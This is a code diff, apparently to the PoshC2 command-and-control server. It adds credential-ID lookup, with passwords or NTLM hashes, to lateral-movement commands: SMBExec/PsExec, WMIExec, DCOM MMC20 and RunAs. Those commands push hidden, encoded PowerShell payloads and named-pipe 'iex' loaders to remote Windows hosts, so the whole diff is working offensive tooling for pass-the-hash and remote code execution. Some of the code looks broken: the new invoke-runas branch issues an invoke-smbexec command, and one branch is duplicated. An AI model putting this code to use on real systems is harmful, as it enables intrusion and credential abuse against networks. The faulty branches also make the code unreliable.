@@ -6,7 +6,7 @@ from DB import new_task, update_sleep, get_history, select_item, update_label, u
 from AutoLoads import check_module_loaded, run_autoloads
 from Help import COMMANDS, posh_help, posh_help1, posh_help2, posh_help3, posh_help4, posh_help5, posh_help6, posh_help7, posh_help8
 from Config import PayloadsDirectory, POSHDIR, ROOTDIR, SocksHost
-from Core import readfile_with_completion, shellcodefilecomplete
+from Core import readfile_with_completion, shellcodefilecomplete, get_creds
 from Opsec import ps_opsec
 from Payloads import Payloads
 from Utils import argp, load_file, gen_key
@@ -151,6 +151,19 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         if ri.lower() == "y":
             sys.exit(0)
 
+    elif command.startswith("invoke-psexec ") or command.startswith("invoke-smbexec "):
+        check_module_loaded("Invoke-SMBExec.ps1", randomuri, user)
+        params = re.compile("invoke-smbexec |invoke-psexec ", re.IGNORECASE)
+        params = params.sub("", command)
+        if "-credid" in params:
+            creds, params = get_creds(params, startup, user)
+            if creds['Password']:
+                params = params + "-domain %s -username %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
+            else:
+                params = params + "-domain %s -username %s -hash %s" % (creds['Domain'], creds['Username'], creds['Hash'])
+        cmd = "invoke-smbexec %s" % params
+        new_task(cmd, user, randomuri)
+
     elif command.startswith("invoke-psexecproxypayload"):
         check_module_loaded("Invoke-PsExec.ps1", randomuri, user)
         if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, "Proxy"))):
@@ -158,6 +171,12 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
                 payload = p.read()
             params = re.compile("invoke-psexecproxypayload ", re.IGNORECASE)
             params = params.sub("", command)
+            if "-credid" in params:
+                creds, params = get_creds(params, startup, user)
+                if creds['Password']:
+                    params = params + "-domain %s -username %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
+                else:
+                    params = params + "-domain %s -username %s -hash %s" % (creds['Domain'], creds['Username'], creds['Hash'])
             cmd = "invoke-psexec %s -command \"%s\"" % (params, payload)
             new_task(cmd, user, randomuri)
         else:
@@ -171,6 +190,12 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
                 payload = p.read()
             params = re.compile("invoke-psexecdaisypayload ", re.IGNORECASE)
             params = params.sub("", command)
+            if "-credid" in params:
+                creds, params = get_creds(params, startup, user)
+                if creds['Password']:
+                    params = params + "-domain %s -username %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
+                else:
+                    params = params + "-domain %s -username %s -hash %s" % (creds['Domain'], creds['Username'], creds['Hash'])
             cmd = "invoke-psexec %s -command \"%s\"" % (params, payload)
             new_task(cmd, user, randomuri)
         else:
@@ -185,10 +210,29 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         payload = newPayload.CreateRawBase()
         params = re.compile("invoke-psexecpayload ", re.IGNORECASE)
         params = params.sub("", command)
+        if "-credid" in params:
+            creds, params = get_creds(params, startup, user)
+            if creds['Password']:
+                params = params + "-domain %s -username %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
+            else:
+                params = params + "-domain %s -username %s -hash %s" % (creds['Domain'], creds['Username'], creds['Hash'])
         cmd = "invoke-psexec %s -command \"powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\"" % (params, payload)
         new_task(cmd, user, randomuri)
 
     # wmi lateral movement
+    elif command.startswith("invoke-wmiexec "):
+        check_module_loaded("Invoke-WMIExec.ps1", randomuri, user)
+        params = re.compile("invoke-wmiexec ", re.IGNORECASE)
+        params = params.sub("", command)
+        if "-credid" in params:
+            creds, params = get_creds(params, startup, user)
+            if creds['Password']:
+                params = params + "-domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
+            else:
+                params = params + "-domain %s -user %s -hash %s" % (creds['Domain'], creds['Username'], creds['Hash'])
+        cmd = "invoke-wmiexec %s" % params
+        new_task(cmd, user, randomuri)
+
     elif command.startswith("invoke-wmiproxypayload"):
         check_module_loaded("Invoke-WMIExec.ps1", randomuri, user)
         if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, "Proxy"))):
@@ -196,6 +240,12 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
                 payload = p.read()
             params = re.compile("invoke-wmiproxypayload ", re.IGNORECASE)
             params = params.sub("", command)
+            if "-credid" in params:
+                creds, params = get_creds(params, startup, user)
+                if creds['Password']:
+                    params = params + "-domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
+                else:
+                    params = params + "-domain %s -user %s -hash %s" % (creds['Domain'], creds['Username'], creds['Hash'])
             cmd = "invoke-wmiexec %s -command \"%s\"" % (params, payload)
             new_task(cmd, user, randomuri)
         else:
@@ -209,6 +259,12 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
                 payload = p.read()
             params = re.compile("invoke-wmidaisypayload ", re.IGNORECASE)
             params = params.sub("", command)
+            if "-credid" in params:
+                creds, params = get_creds(params, startup, user)
+                if creds['Password']:
+                    params = params + "-domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
+                else:
+                    params = params + "-domain %s -user %s -hash %s" % (creds['Domain'], creds['Username'], creds['Hash'])
             cmd = "invoke-wmiexec %s -command \"%s\"" % (params, payload)
             new_task(cmd, user, randomuri)
         else:
@@ -223,22 +279,12 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         payload = newPayload.CreateRawBase()
         params = re.compile("invoke-wmipayload ", re.IGNORECASE)
         params = params.sub("", command)
-        if "-credid" in command:
-            p = re.compile(r"-credid (\w*)")
-            credId = re.search(p, command)
-            if credId:
-                credId = credId.group(1)
-            else:
-                startup(user, "Please specify a credid")
-            creds = get_cred_by_id(credId)
-            if creds is None:
-                startup(user, "Unrecognised CredID: %s" % credId)
-            params = params.replace("-credid %s" % credId, "")
+        if "-credid" in params:
+            creds, params = get_creds(params, startup, user)
             if creds['Password']:
                 params = params + "-domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
             else:
                 params = params + "-domain %s -user %s -hash %s" % (creds['Domain'], creds['Username'], creds['Hash'])
-
         cmd = "invoke-wmiexec %s -command \"powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\"" % (params, payload)
         new_task(cmd, user, randomuri)
 
@@ -249,6 +295,12 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
                 payload = p.read()
             params = re.compile("invoke-wmiproxypayload ", re.IGNORECASE)
             params = params.sub("", command)
+            if "-credid" in params:
+                creds, params = get_creds(params, startup, user)
+                if creds['Password']:
+                    params = params + "-domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
+                else:
+                    params = params + "-domain %s -user %s -hash %s" % (creds['Domain'], creds['Username'], creds['Hash'])
             p = re.compile(r'(?<=-target.).*')
             target = re.search(p, command).group()
             pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\cmd.exe\",$null,\"/c %s\",\"7\")" % (target, payload)
@@ -280,6 +332,20 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         new_task(pscommand, user, randomuri)
 
     # runas payloads
+    elif command.startswith("invoke-runas "):
+        check_module_loaded("Invoke-RunAs.ps1", randomuri, user)
+        params = re.compile("invoke-runas ", re.IGNORECASE)
+        params = params.sub("", command)
+        if "-credid" in params:
+            creds, params = get_creds(params, startup, user)
+            if creds['Password']:
+                params = params + "-domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
+            else:
+                startup(user, "invoke-runas does not support hash authentication")
+
+        cmd = "invoke-smbexec %s" % params
+        new_task(cmd, user, randomuri)
+
     elif command.startswith("invoke-runasdaisypayload"):
         daisyname = input("Name required: ")
         if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, daisyname))):
@@ -290,6 +356,12 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
             check_module_loaded("NamedPipeDaisy.ps1", randomuri, user)
             params = re.compile("invoke-runasdaisypayload ", re.IGNORECASE)
             params = params.sub("", command)
+            if "-credid" in params:
+                creds, params = get_creds(params, startup, user)
+                if creds['Password']:
+                    params = params + "-domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
+                else:
+                    startup(user, "invoke-runas does not support hash authentication")
             pipe = "add-Type -assembly System.Core; $pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSDaisy'); $pi.Connect(); $pr = new-object System.IO.StreamReader($pi); iex $pr.ReadLine();"
             pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params, base64.b64encode(pipe.encode('UTF-16LE')).decode("utf-8"))
             new_task(pscommand, user, randomuri)
@@ -311,6 +383,12 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
             check_module_loaded("NamedPipeProxy.ps1", randomuri, user)
             params = re.compile("invoke-runasproxypayload ", re.IGNORECASE)
             params = params.sub("", command)
+            if "-credid" in params:
+                creds, params = get_creds(params, startup, user)
+                if creds['Password']:
+                    params = params + "-domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
+                else:
+                    startup(user, "invoke-runas does not support hash authentication")
             pipe = "add-Type -assembly System.Core; $pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSProxy'); $pi.Connect(); $pr = new-object System.IO.StreamReader($pi); iex $pr.ReadLine();"
             pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params, base64.b64encode(pipe.encode('UTF-16LE')).decode("utf-8"))
             new_task(pscommand, user, randomuri)
@@ -320,6 +398,12 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         check_module_loaded("NamedPipe.ps1", randomuri, user)
         params = re.compile("invoke-runaspayload ", re.IGNORECASE)
         params = params.sub("", command)
+        if "-credid" in params:
+            creds, params = get_creds(params, startup, user)
+            if creds['Password']:
+                params = params + "-domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
+            else:
+                startup(user, "invoke-runas does not support hash authentication")
         pipe = "add-Type -assembly System.Core; $pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMS'); $pi.Connect(); $pr = new-object System.IO.StreamReader($pi); iex $pr.ReadLine();"
         pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params, base64.b64encode(pipe.encode('UTF-16LE')).decode("utf-8"))
         new_task(pscommand, user, randomuri)
